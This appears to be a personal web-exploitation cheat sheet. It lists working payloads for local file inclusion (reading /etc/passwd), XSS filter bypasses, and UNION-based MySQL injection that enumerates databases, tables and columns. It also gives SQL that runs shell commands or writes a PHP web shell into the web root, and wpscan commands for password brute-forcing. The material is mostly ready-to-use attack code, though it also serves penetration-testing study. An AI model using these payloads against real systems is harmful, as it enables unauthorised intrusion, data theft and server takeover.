# Exploitation
Tools and options I use for reconnaissance:
- [Web](#web)
  - [Shell](#shell)
  - [LFI](#lfi)
  - [XSS](#xss)
  - [SQL Injection](#sql-injection)
  - [Wordpress](#wordpress)

----

## Web
Techniques and tools I use for web exploitations.

### Shell
Usefull webshells on Kali: `/usr/share/webshells/`

### LFI 
###### LFI = Local File Inclusion.  

Example scenario:   
```bash
http://<target>/index.php?parameter=value
```

Validate LFI:   
```bash
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
# OR
http://<target>/index.php?page=../../../../../../../../etc/passwd
```

Useful links:   
- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)


### XSS
Verify XSS:  
```javascript
<script>alert('XSS')</script>

//OR
"><script>alert('XSS')</script>">

//OR
<script>alert(String.fromCharCode(88,83,83))</script>
```

Bypass filter of tag script:   
```javascript
" onload="alert(String.fromCharCode(88,83,83))

//OR
" onload="alert('XSS')
```

**nope** is not a valid image source, so this cause an error an triggers the `onerror`.
```javascript
<img src='nope' onerror=alert("XSS")>
```

Useful links:  
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)


### SQL Injection
###### All examples are with MySQL syntax!
Verify SQL injection: add a simple quote`'`. 
```bash
# Examples
http://target.com/path/?id=5'
```

Sorting columns to find maximum column:
```bash
http://target.com/path/?id=-1 order by 1
http://target.com/path/?id=-1 order by 2
http://target.com/path/?id=-1 order by 3
http://target.com/path/?id=-1 order by 4
# ...
# Try until it stops returing errors, now we have the column count
```

Verify injectable column:  
```bash
http://target.com/path/?id=-1 union select 1, 2, 3, 4
# Select count is depending on the table, maybe try the previous example
# One of the columns will be printed with the respective number
```

Discover various informations:  
```bash
# Discover version
http://target.com/path/?id=-1 union select 1, 2, 3, version()

# Discover database name
http://target.com/path/?id=-1 union select 1, 2, 3, database()

# Discover logged in usernames
http://target.com/path/?id=-1 union select 1, 2, 3, current_user()

# Discover databases
http://target.com/path/?id=-1 union select 1, 2, 3, schema_name from information_schema.schemata

# Discover table names of database
http://target.com/path/?id=-1 union select 1, 2, 3, table_name from information_schema.tables where table_schema="database_name"

# Discover columns of database
http://target.com/path/?id=-1 union select 1, 2, 3, column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"
```

Execute shell commands:
```sql
# Example usage
SELECT trim(trailing char(0x00) from exec_cmd("echo 'Hello World'"));

# Decode base64 string and write to file
SELECT trim(trailing char(0x00) from exec_cmd("echo 'SGVsbG8gV29ybGQK' | base64 -d >> /tmp/test.txt"));
```

Create a web shell:
```sql
SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/shell.php"
```


### Wordpress
Enumerate wordpress page:
```bash
$ wpscan --url <URL> -o <FILE>
```

Bruteforce password:
```bash
$ wpscan --url <URL> --usernames <USERNAME> --passwords <WORDLIST>
```

